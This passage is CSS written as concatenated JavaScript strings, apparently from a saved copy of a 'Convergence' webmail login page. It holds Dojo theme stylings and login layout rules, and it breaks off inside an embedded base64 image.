'    background: #ededed /*savepage-url=../../../dijit/themes/tundra/images/buttonActive.png*/ url() bottom repeat-x;'+
'}'+
''+
'/* Make the menu look more combobox-like */'+
'.tundra .dojoxDropDownSelectMenu td {'+
' padding: 0em;'+
'}'+
'.tundra .dojoxDropDownSelectMenu .dijitMenuItemIcon {'+
' margin: 0.1em 0.2em;'+
' display: none;'+
'}'+
'.tundra .dojoxDropDownSelectMenu .dijitMenuItemLabel,'+
'.tundra .dojoxDropDownSelectMenu .dijitMenuArrowCell {'+
' padding: 0.1em 0.2em;'+
'}'+
''+
'/*'+
'**----------------------------------------------------------------------------'+
'**  Soria stylings'+
'**----------------------------------------------------------------------------'+
'*/'+
'/* Cursor States */'+
'.soria .dojoxDropDownSelectDisabled * {'+
'    cursor: not-allowed !important;'+
'}'+
'.soria .dojoxDropDownSelectReadOnly * {'+
'    cursor: default !important;'+
'}'+
'.soria .dojoxDropDownSelect .dijitButtonNode {'+
' padding: 0px;'+
'}'+
''+
'/* Make unselected "look" more like a text box and less like a button */'+
'.soria .dojoxDropDownSelect .dijitButtonContents {'+
' padding-top: 1px;'+
'    background:#fff /*savepage-url=../../../dijit/themes/soria/images/validationInputBg.png*/ url() repeat-x top left;'+
'    #background:#fff /*savepage-url=../../../dijit/themes/soria/images/validationInputBg.gif*/ url() repeat-x top left;'+
'}'+
'.soria .dojoxDropDownSelectHover .dijitButtonContents,'+
'.soria .dojoxDropDownSelectActive .dijitButtonContents,'+
'.soria .dojoxDropDownSelectOpened .dijitButtonContents,'+
'.soria .dojoxDropDownSelectDisabled .dijitButtonContents,'+
'.soria .dojoxDropDownSelectReadOnly .dijitButtonContents{'+
' background: transparent none;'+
'}'+
'.dj_ie .soria .dojoxDropDownSelect .dijitButtonContents {'+
' padding-top: 0px;'+
'}'+
''+
'/* Mirror DropDownButton */'+
'.soria .dojoxDropDownSelectDisabled .dijitButtonNode {'+
'    border-color: #b9bbdd #b9bbdd #b9bbdd #b9bbdd;'+
'    background:#c3d3e5 /*savepage-url=../../../dijit/themes/soria/images/buttonDisabled.png*/ url() top repeat-x;'+
'}'+
'.dj_ie .soria .dojoxDropDownSelectDisabled  .dijitButtonNode * {'+
' filter: gray() alpha(opacity=50);'+
'}'+
''+
'.soria .dojoxDropDownSelectHover .dijitButtonNode {'+
'    color:#000;'+
'    background:#acc5e2 /*savepage-url=../../../dijit/themes/soria/images/buttonHover.png*/ url() repeat-x top left;'+
'}'+
''+
'.soria .dojoxDropDownSelectActive .dijitButtonNode,'+
'.soria .dojoxDropDownSelectOpened .dijitButtonNode {'+
'    border-color:#657c9c;'+
'    background: #91b4e5 /*savepage-url=../../../dijit/themes/soria/images/buttonActive.png*/ url() top left repeat-x;'+
'}'+
''+
'/* Make the menu look more combobox-like */'+
'.soria .dojoxDropDownSelectMenu td {'+
' padding: 0em;'+
'}'+
'.soria .dojoxDropDownSelectMenu .dijitMenuItemIcon {'+
' margin: 0.1em 0.2em;'+
' display: none;'+
'}'+
'.soria .dojoxDropDownSelectMenu .dijitMenuItemLabel,'+
'.soria .dojoxDropDownSelectMenu .dijitMenuArrowCell {'+
' padding: 0.1em 0.2em;'+
'}'+
''+
'/*'+
'**----------------------------------------------------------------------------'+
'**  Nihilo stylings'+
'**----------------------------------------------------------------------------'+
'*/'+
'/* Cursor States */'+
'.nihilo .dojoxDropDownSelectDisabled * {'+
'    cursor: not-allowed !important;'+
'}'+
'.nihilo .dojoxDropDownSelectReadOnly * {'+
'    cursor: default !important;'+
'}'+
'.nihilo .dojoxDropDownSelect .dijitButtonNode {'+
' padding: 0px;'+
'}'+
''+
'/* Make unselected "look" more like a text box and less like a button */'+
'.nihilo .dojoxDropDownSelect .dijitButtonContents {'+
' padding-top: 1px;'+
'    background:#fff /*savepage-url=../../../dijit/themes/nihilo/images/validationInputBg.png*/ url() repeat-x top left;'+
'    #background:#fff /*savepage-url=../../../dijit/themes/nihilo/images/validationInputBg.gif*/ url() repeat-x top left;'+
'}'+
'.nihilo .dojoxDropDownSelectHover .dijitButtonContents,'+
'.nihilo .dojoxDropDownSelectActive .dijitButtonContents,'+
'.nihilo .dojoxDropDownSelectOpened .dijitButtonContents,'+
'.nihilo .dojoxDropDownSelectDisabled .dijitButtonContents,'+
'.nihilo .dojoxDropDownSelectReadOnly .dijitButtonContents{'+
' background: transparent none;'+
'}'+
'.dj_ie .nihilo .dojoxDropDownSelect .dijitButtonContents {'+
' padding-top: 0px;'+
'}'+
''+
'/* Mirror DropDownButton */'+
'.nihilo .dojoxDropDownSelectDisabled .dijitButtonNode {'+
'    border-color: #dedede;'+
'    background:#fafafa /*savepage-url=../../../dijit/themes/nihilo/images/buttonDisabled.png*/ url() top repeat-x;'+
'}'+
'.dj_ie .nihilo .dojoxDropDownSelectDisabled  .dijitButtonNode * {'+
' filter: gray() alpha(opacity=50);'+
'}'+
''+
'.nihilo .dojoxDropDownSelectHover .dijitButtonNode {'+
'    color:#000;'+
'    background:#fcfcfc /*savepage-url=../../../dijit/themes/nihilo/images/buttonHover.png*/ url() repeat-x top left;'+
'}'+
''+
'.nihilo .dojoxDropDownSelectActive .dijitButtonNode,'+
'.nihilo .dojoxDropDownSelectOpened .dijitButtonNode {'+
'    border-color:#dedede;'+
'    background: #f5f5f5 /*savepage-url=../../../dijit/themes/nihilo/images/buttonActive.png*/ url() top left repeat-x;'+
'}'+
''+
'/* Make the menu look more combobox-like */'+
'.nihilo .dojoxDropDownSelectMenu td {'+
' padding: 0em;'+
'}'+
'.nihilo .dojoxDropDownSelectMenu .dijitMenuItemIcon {'+
' margin: 0.1em 0.2em;'+
' display: none;'+
'}'+
'.nihilo .dojoxDropDownSelectMenu .dijitMenuItemLabel,'+
'.nihilo .dojoxDropDownSelectMenu .dijitMenuArrowCell {'+
' padding: 0.1em 0.2em;'+
'}'+
''+
'  </style>'+
'  <style data-savepage-href="css/login.css?02.01_183522" type="text/css">/*'+
'CSS for login'+
'*/'+
''+
'/*'+
'@import url("dijit/Button.css");'+
'@import url("dijit/DropDownSelect.css");'+
'*/'+
''+
'body {'+
' font-family: Tahoma, sans-serif;'+
'    font-size:12px;'+
'}'+
''+
'.dj_ie body {'+
' /* We have to overwrite the font attribute from dojo as well, or we run'+
' into problems on IE */'+
' font: 12px Tahoma, sans-serif;'+
'}'+
''+
'.Convergence-Login {'+
' position:absolute;'+
' left:50%;'+
' top:25%;'+
' width:650px;'+
' margin-top:-125px;'+
' margin-left:-280px;'+
' border-top: 2px solid #EDEDED;'+
' border-left: 1px solid #EEEEEE;'+
' border-bottom: 1px solid #8F8F8F;'+
' border-right: 1px solid #B9B9B9;'+
'}'+
''+
'.Convergence-Login-Border {'+
' width: 650px;'+
' border-top: 1px solid #F8F8F8;'+
' border-left: 1px solid #F9F9F9;'+
' border-bottom: 1px solid #DADADA;'+
' border-right: 1px solid #E9E9E9;'+
'}'+
''+
'.Convergence-Login-Banner {'+
' padding: 7px 0 0 10px;'+
' border-bottom: 1px solid #DADADA;'+
'}'+
''+
'.Convergence-Login-Logo {'+
' background-color: transparent;'+
' background-image: /*savepage-url=../images/logo_acad.gif?00.01_211737*/ url();'+
' background-repeat: no-repeat;'+
' background-position: 50% 50%;'+
' width: 138px;'+
' height: 18px;'+
' padding: 0 0 10px 5px;'+
' border-bottom: 2px solid #999;'+
'}'+
''+
''+
'.Convergence-Login-WelcomeMsg {'+
' font-size: 22px;'+
' font-weight: bold;'+
' margin: 15px 0 15px 0;'+
' text-align: center;'+
'}'+
''+
'.Convergence-Login-Notification {'+
' margin: 10px 10px;'+
' background-color: transparent;'+
' background-repeat: no-repeat;'+
' background-position: 0 0;'+
' padding: 1px 0 0 22px;'+
' color: red;'+
' font-size: 14px;'+
' font-weight: bold;'+
' height: 26px;'+
' text-align: center;'+
'}'+
''+
'.Convergence-Login-Notification-logvide {'+
' margin: 2px 10px;'+
' background-color: transparent;'+
' background-image: /*savepage-url=../images/info.png?02.01_183522*/ url();'+
' background-repeat: no-repeat;'+
' background-position: 0 0;'+
' padding: 1px 0 0 22px;'+
' color: red;'+
' font-size: 11px;'+
' height: 26px;'+
'}'+
''+
'.Convergence-Login-Form {'+
'    margin: 0 220px 0 0px;'+
' float: right;'+
' width: 398px;'+
'}'+
''+
'.Convergence-Login-SelectLang {'+
'    margin: 0 0px 0 10px;'+
' float: left;'+
'}'+
''+
'.Convergence-Login-FormRow {'+
'    padding-bottom: 8px;'+
' text-align: right;'+
'}'+
''+
'.Convergence-Login-Form label {'+
'    padding-right: 4px;'+
'}'+
''+
'.Convergence-Login input[type=text],'+
'.Convergence-Login input[type=password]{'+
'    width: 125px;'+
'}'+
''+
'.dj_webkit .Convergence-Login input[type=text],'+
'.dj_webkit .Convergence-Login input[type=password]{'+
'    padding: 2px;'+
'}'+
''+
'div.Convergence-Login-Buttons {'+
' padding-bottom: 0px;'+
'}'+
''+
'div.Convergence-Login-FormButton {'+
' width: 129px;'+
' float: right;'+
'}'+
''+
'.dj_webkit div.Convergence-Login-FormButton {'+
' width: 133px;'+
'}'+
''+
'.dj_ff36_mac div.Convergence-Login-FormButton {'+
' width: 131px;'+
'}'+
''+
'div.Convergence-Login-FormButton div {'+
' text-align: left;'+
'}'+
''+
'.dijitButton, dijitDropDownButton {'+
' margin: 0;'+
'}'+
''+
'.Convergence-Login .dijitButtonText,'+
'.Convergence-Login .dojoxDropDownSelectLabel {'+
' font-size: 12px;'+
'}'+
''+
'.Convergence-Login .dojoxDropDownSelect .dijitButtonContents{'+
' padding: 1px 0 2px 1px;'+
'}'+
''+
'.dojoxDropDownSelectFixedWidth {'+
'    width: 125px;'+
' margin: 0;'+
'}'+
''+
'.dj_gecko .Convergence-Login-FormButton .dijitButtonNode {'+
' padding: 0 0 1px 0;'+
'}'+
''+
'.dj_ie .Convergence-Login-FormButton .dijitButtonNode {'+
' padding: 0;'+
'}'+
''+
'.dj_ie .Convergence-Login-FormButton .dijitButtonContents {'+
' line-height: 12px;'+
' height: 18px;'+
'}'+
''+
'.Convergence-Login-RedBand {'+
' margin: 3px 0 0 -1px;'+
' background-image:/*savepage-url=../images/bandeau_maison.png?00.01_211737*/var(--savepage-url-9);'+
' background-position: left top;'+
' height: 145px;'+
' width: 640px;'+
'}'+
''+
'.Convergence-Login-RedBand-Bas {'+
' margin: 20px 0 7px -1px;'+
' background-position: center top;'+
' text-align: center;'+
' width: 640px;'+
'}'+
''+
'.dj_webkit .Convergence-Login-RedBand {'+
' text-align: center;'+
'}'+
''+
'.Convergence-Login-Copyright {'+
' font-size: 11px;'+
' padding: 8px 10px 8px 8px;'+
' text-align:center;'+
'}'+
''+
'.Notification-Spam {'+
'        font-size: 15px;'+
'        text-align: center;'+
'        height: 18px;'+
'        width: 640px;'+
'        background-color: red;'+
'        color: #ffffff;'+
'        padding: 0 10px 0 0;'+
'}'+
''+
'.Old-Webmail {'+
'        font-size: 15px;'+
'        text-align: center;'+
'        height: 16px;'+
'        width: 650px;'+
'        padding: 0 10px 0 0;'+
'}'+
''+
''+
''+
'#spinner {'+
'    position: absolute;'+
'    padding-top: 30px;'+
'    background:#FFF /*savepage-url=../images/login-spinner.gif?02.01_183522*/ url() no-repeat top left; /* NOT THEMED */'+
'    width: 100px;'+
'}'+
''+
'#progress{'+
'    text-align: left;'+
'}'+
'</style>'+
'  <script data-savepage-type="text/javascript" type="text/plain"></script>'+
''+
'  <script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="../../../js/dojotoolkit/dojo/dojo.js"></script>'+
'<style id="savepage-cssvariables">'+
'  :root {'+
'    --savepage-url-9: url(data:image/png;base64,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